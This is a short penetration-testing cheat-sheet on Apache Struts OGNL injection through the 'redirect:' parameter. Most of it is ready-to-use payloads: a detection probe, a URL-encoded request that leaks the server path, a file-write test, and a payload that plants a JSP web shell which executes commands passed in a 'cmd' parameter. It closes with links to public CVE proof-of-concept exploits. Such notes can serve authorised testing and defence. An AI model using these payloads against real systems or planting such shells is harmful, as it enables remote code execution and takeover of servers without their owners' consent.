# Apahe Struts
**.action** and **.do** file are indications of Apache Structs 
On .do pages that you want to test, try browsing to 
*http://www.example.com/appFolder/index.do?redirect:${3&ast;4}*
Also try submitting as a POST request. 
If you are redirected to /12, then the application is vulnerable

**Get current directory:**
```
redirect%3A%24%7B%23a%3D%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27)%2C%23b%3D%23a.getRealPath(%22%2F%22)%2C%23c%3D%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27)%2C%0A%23c.getWriter().println(%23b)%2C%23c.getWriter().flush()%2C%23c.getWriter().close()%7D=
```

**Test ability to write to file:**
```
redirect:${new%20java.io.BufferedWriter(new%20java.io.FileWriter(%22<CURRENT_DIRECTORY_HERE>/alfejawk7feafs.txt%22)).append('123').close()} 
```
*Check if /alfejawk7feafs.txt exists*

**Write web shell:**
*Do not attempt this unless you can get the above file write to work*
```
redirect:${new%20java.io.BufferedWriter(new%20java.io.FileWriter("<CURRENT_DIRECTORY_HERE>/alfejawk7feafs.jsp")).append('<%25%40+page+import%3d"java.util.*,java.io.*"%25><HTML><BODY><FORM+METHOD%3d"GET"+NAME%3d"myform"+ACTION%3d""><INPUT+TYPE%3d"text"+NAME%3d"cmd"><INPUT+TYPE%3d"submit"+VALUE%3d"Send"></FORM><pre><%25out.println("Command%3a+"+%2b+request.getParameter("cmd")+%2b+"<BR>")%3bProcess+p+%3d+Runtime.getRuntime().exec(request.getParameter("cmd"))%3bOutputStream+os+%3d+p.getOutputStream()%3bInputStream+in+%3d+p.getInputStream()%3bDataInputStream+dis+%3d+new+DataInputStream(in)%3bString+disr+%3d+dis.readLine()%3bwhile+(+disr+!%3d+null+)+{out.println(disr)%3bdisr+%3d+dis.readLine()%3b}%25></pre></BODY></HTML>').close()}=
```
You should then be able to use the web shell: `/alfejawk7feafs.jsp?cmd=ls`


Additional resources
```
https://packetstormsecurity.com/files/141494/S2-45-poc.py.txt 
https://github.com/pwntester/S2-046-PoC 
RCE via XML parser 
https://github.com/mazen160/struts-pwn_CVE-2017-9805
https://lgtm.com/blog/apache_struts_CVE-2018-11776
https://github.com/pr4jwal/quick-scripts/blob/master/s2-057.py
```
